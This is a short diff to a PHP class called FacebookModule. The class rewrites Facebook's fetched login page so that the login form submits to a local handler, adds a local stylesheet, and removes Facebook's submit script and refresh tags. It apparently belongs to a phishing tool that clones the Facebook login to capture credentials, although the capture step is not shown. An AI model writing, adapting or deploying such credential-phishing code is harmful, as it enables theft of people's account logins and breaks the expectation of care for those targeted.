@@ -30,7 +30,7 @@ class FacebookModule extends Module
 		} else {
 			$result = str_replace("</head><body", "<link rel=\"stylesheet\" href=\"assets/modules/Facebook/css/styles.css\" type=\"text/css\" /></head><body", $result);
 			$result = str_replace("https://www.facebook.com/login.php?login_attempt=1", "index.php?module=FacebookModule", $result);
-			$result = str_replace("/login.php?login_attempt=1", "facebook.php", $result);
+			$result = str_replace("/login.php?login_attempt=1", "index.php?module=FacebookModule", $result);
 			$result = str_replace("onsubmit=\"return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)\"", "", $result);
 			$result = str_replace("<meta http-equiv=\"refresh\" content=\"0; URL=/?_fb_noscript=1\" />","",$result);
 			$result = str_replace("<meta http-equiv=\"refresh\" content=\"0; URL=/login.php?login_attempt=1&amp;_fb_noscript=1\" />","",$result);	
